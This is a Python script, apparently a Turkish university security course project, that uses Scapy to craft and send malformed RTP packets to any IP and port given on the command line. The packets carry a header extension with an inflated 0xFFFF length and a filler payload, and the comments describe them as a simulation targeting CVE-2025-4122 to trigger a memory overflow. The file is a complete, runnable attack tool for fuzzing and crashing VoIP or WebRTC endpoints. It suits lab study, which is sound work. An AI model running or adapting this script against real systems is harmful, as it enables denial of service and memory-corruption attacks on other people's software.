# -*- coding: utf-8 -*-
# NetForge-RTC: WebRTC Packet Manipulation Framework
# Istinye University - Bilişim Güvenliği Teknolojisi Final Project

import sys
import socket

# Scapy kütüphanesinin varlığını kontrol etme 
try:
    from scapy.all import IP, UDP, Raw, send
except ImportError:
    print("[-] Hata: 'scapy' kütüphanesi bulunamadı!")
    print("[*] Lütfen kurun: pip install scapy")
    sys.exit(1)

def generate_malformed_rtp(target_ip, target_port, packet_count=1):
    print(f"\n[*] NetForge-RTC Başlatıldı...")
    print(f"[*] Hedef IP: {target_ip}:{target_port}")
    print(f"[*] Gönderilecek Paket Sayısı: {packet_count}\n" + "-"*40)
    
    # Standart RTP Başlığı (V=2, P=0, X=1, CC=0, M=1, PT=96)
    # Extension biti aktif edilerek sahte uzunluk verilecek
    rtp_header = b'\x90\x60\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00'
    
    # Tehdit Modeli (CVE-2025-4122 Hedefli Simülasyon): 
    # Uzunluk değerini (Extension Length) aşırı büyük göstererek bellek taşması tetikleme senaryosu.
    # 0xFFFF değeri sistemin çok büyük bir extension alanı okumasını bekletir.
    malformed_extension = b'\xBE\xDE\xFF\xFF' 
    
    # Arabellek yönetimini test etmek için yapay payload
    payload = b"A" * 1024
    
    packet_data = rtp_header + malformed_extension + payload
    
    # Scapy ile IP ve UDP Katmanlarının İnşası
    pkt = IP(dst=target_ip)/UDP(sport=5004, dport=target_port)/Raw(load=packet_data)
    
    success_count = 0
    for i in range(1, packet_count + 1):
        try:
            send(pkt, verbose=False)
            print(f"[+] [{i}] Manipüle edilmiş RTP paketi başarıyla enjekte edildi.")
            success_count += 1
        except Exception as e:
            print(f"[-] [{i}] Paket gönderim hatası: {str(e)}")
            
    print("-"*40 + f"\n[+] İşlem Tamamlandı. Başarılı: {success_count}/{packet_count}\n")

if __name__ == "__main__":
    # Dinamik Argüman Kontrolü (Hoca sunumda istediği IP'yi yazabilsin diye)
    if len(sys.argv) >= 3:
        target = sys.argv[1]
        try:
            port = int(sys.argv[2])
        except ValueError:
            print("[-] Hata: Port numarası geçerli bir sayı olmalıdır!")
            sys.exit(1)
            
        count = int(sys.argv[3]) if len(sys.argv) == 4 else 1
        generate_malformed_rtp(target, port, count)
    else:
        # Argüman girilmezse çalışacak varsayılan Lab parametreleri
        print("[*] Kullanım: python3 fuzzer.py <Hedef_IP> <Port> <Paket_Sayısı>")
        print("[*] Varsayılan laboratuvar parametreleri devreye alınıyor...")
        
        test_target = "192.168.1.50"
        test_port = 16384
        generate_malformed_rtp(test_target, test_port, packet_count=5)
